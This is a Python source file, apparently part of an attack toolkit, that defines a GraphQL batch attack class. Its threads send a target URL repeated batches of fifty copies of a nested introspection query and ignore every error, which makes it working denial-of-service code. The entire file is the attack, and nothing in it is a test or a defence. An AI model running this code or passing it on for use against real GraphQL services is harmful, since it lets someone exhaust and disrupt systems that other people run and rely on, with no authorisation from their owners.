import requests
import threading
import time
from utils.logger import logger
from config.settings import config

class GraphQLBatchAttack:
    def __init__(self):
        self.running = False

    def attack(self, url, queries_per_batch=50, batches=100, threads=10):
        self.running = True
        logger.info(f"GraphQL batch attack on {url}")

        payload = {
            "query": "query { __schema { types { name fields { name type { name fields { name } } } } } }"
        }

        def worker():
            while self.running:
                try:
                    batch = [payload] * queries_per_batch
                    requests.post(url, json=batch, timeout=5)
                except:
                    pass

        workers = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            workers.append(t)

        # Let run for approx. batches
        for _ in range(batches):
            time.sleep(0.1)
        self.running = False
        for t in workers:
            t.join()
        logger.info("GraphQL batch attack finished")